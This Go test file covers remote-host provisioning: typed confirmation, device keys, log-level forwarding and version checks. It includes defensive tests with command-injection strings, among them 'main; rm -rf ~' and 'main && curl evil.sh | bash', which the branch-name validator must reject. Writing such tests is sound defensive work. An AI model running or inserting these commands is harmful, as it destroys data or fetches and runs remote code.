package app

import (
	"strings"
	"testing"
)

func TestNormalizeScriptNewlines(t *testing.T) {
	if got := normalizeScriptNewlines("a\r\nb\rc\nd"); got != "a\nb\nc\nd" {
		t.Fatalf("规范化结果 = %q", got)
	}
}

// 首次置备必须显式确认；已装过 Dec 的机器视为已建立信任，不再反复确认。
func TestProvisionTypedConfirmRequiredOnFirstProvisionOnly(t *testing.T) {
	target := RemoteTarget{Host: "build.example", User: "dev"}

	first := AnalyzeProvisionTypedConfirm(target, &RemoteHostProbe{DecInstalled: false})
	if !first.Required {
		t.Fatal("首次置备必须要求显式确认")
	}
	if first.Expect != "dev@build.example" {
		t.Fatalf("应要求键入目标名，实际 %q", first.Expect)
	}

	again := AnalyzeProvisionTypedConfirm(target, &RemoteHostProbe{DecInstalled: true})
	if again.Required {
		t.Fatal("已安装的机器升级不应反复要求确认")
	}
	if !MatchProvisionTypedConfirm("", false, again) {
		t.Fatal("不需要确认时应直接通过")
	}
}

// probe 为 nil 时必须按最保守处理，要求确认。
func TestProvisionTypedConfirmRequiredWhenProbeUnknown(t *testing.T) {
	spec := AnalyzeProvisionTypedConfirm(RemoteTarget{Alias: "box"}, nil)
	if !spec.Required {
		t.Fatal("探测结果未知时应要求确认")
	}
}

func TestMatchProvisionTypedConfirm(t *testing.T) {
	spec := AnalyzeProvisionTypedConfirm(RemoteTarget{Alias: "build-box"}, nil)

	if MatchProvisionTypedConfirm("", false, spec) {
		t.Fatal("空输入不应通过")
	}
	if MatchProvisionTypedConfirm("wrong-host", false, spec) {
		t.Fatal("错误主机名不应通过")
	}
	if !MatchProvisionTypedConfirm("build-box", false, spec) {
		t.Fatal("正确主机名应通过")
	}
	if !MatchProvisionTypedConfirm("PROVISION", false, spec) {
		t.Fatal("PROVISION 应通过")
	}
	if !MatchProvisionTypedConfirm("", true, spec) {
		t.Fatal("MCP 的 confirmed=true 应通过")
	}
}

// 设备互斥键必须稳定且大小写无关，不同目标机不得撞键。
func TestDeviceOperationKey(t *testing.T) {
	a := DeviceOperationKey(RemoteTarget{Host: "Build.Example", User: "Dev"})
	b := DeviceOperationKey(RemoteTarget{Host: "build.example", User: "dev"})
	if a != b {
		t.Fatalf("同一目标应产生同一键: %q vs %q", a, b)
	}
	if !IsDeviceOperationKey(a) {
		t.Fatalf("应被识别为设备键: %q", a)
	}
	other := DeviceOperationKey(RemoteTarget{Alias: "other-box"})
	if other == a {
		t.Fatal("不同目标不得撞键")
	}
	if IsDeviceOperationKey("D:/workspace/GitHub/Dec") {
		t.Fatal("真实项目路径不应被误判为设备键")
	}
	if IsDeviceOperationKey("") {
		t.Fatal("空值不应被误判为设备键")
	}
}

// 分支名会拼进远端命令行，必须挡住命令注入。
func TestValidBranchNameRejectsInjection(t *testing.T) {
	bad := []string{
		"main; rm -rf ~",
		"main && curl evil.sh | bash",
		"main`whoami`",
		"main$(id)",
		"main|tee",
		"main\nrm -rf /",
		"main'",
		"main\"",
		"main x",
	}
	for _, name := range bad {
		if validBranchName(name) {
			t.Fatalf("应拒绝危险分支名: %q", name)
		}
	}
	for _, name := range []string{"ReleaseLatest", "ReleaseTest", "feature/foo-bar_v1.2"} {
		if !validBranchName(name) {
			t.Fatalf("应接受合法分支名: %q", name)
		}
	}
}

func TestStripANSIAndBoxDrawing(t *testing.T) {
	if got := stripANSI("\033[0;32m✓\033[0m  安装成功"); got != "✓  安装成功" {
		t.Fatalf("去色结果 = %q", got)
	}
	if !isBoxDrawing("╔═══════════════╗") {
		t.Fatal("装饰行应被识别")
	}
	if isBoxDrawing("下载 Dec 程序组...") {
		t.Fatal("正常内容不应被当作装饰行")
	}
}

// 远端输出必须按级别转发，警告与错误不能被降级成 info。
func TestForwardRemoteOutputMapsLevels(t *testing.T) {
	var levels []EventLevel
	var messages []string
	reporter := ReporterFunc(func(event OperationEvent) {
		levels = append(levels, event.Level)
		messages = append(messages, event.Message)
	})

	forwardRemoteOutput(reporter, "provision.install", strings.Join([]string{
		"╔════════════╗",
		"",
		"\033[0;34mℹ\033[0m  检测到平台: linux-amd64",
		"\033[1;33m⚠\033[0m  未提供产物摘要",
		"\033[0;31m✗\033[0m  下载失败",
	}, "\n"))

	if len(levels) != 3 {
		t.Fatalf("应转发 3 条（跳过装饰行与空行），实际 %d: %v", len(levels), messages)
	}
	if levels[0] != EventInfo || levels[1] != EventWarn || levels[2] != EventError {
		t.Fatalf("级别映射错误: %v", levels)
	}
	if !strings.Contains(messages[1], "未提供产物摘要") {
		t.Fatalf("消息内容错误: %q", messages[1])
	}
}

// 目标机存在阻断项时必须拒绝置备，而不是装到一半失败。
func TestProvisionRejectsInvalidTarget(t *testing.T) {
	if _, err := ProvisionRemoteHost(nil, ProvisionRemoteHostInput{}, nil); err == nil {
		t.Fatal("空目标应报错")
	}
}

func TestProvisionVersionMustBeReleaseSemver(t *testing.T) {
	for _, value := range []string{"v1.13.48", "1.13.48"} {
		if !validReleaseVersion(value) {
			t.Fatalf("expected valid version %q", value)
		}
	}
	for _, value := range []string{"dev", "v1.2", "v1.2.x", "v1.2.3;rm"} {
		if validReleaseVersion(value) {
			t.Fatalf("expected invalid version %q", value)
		}
	}
}
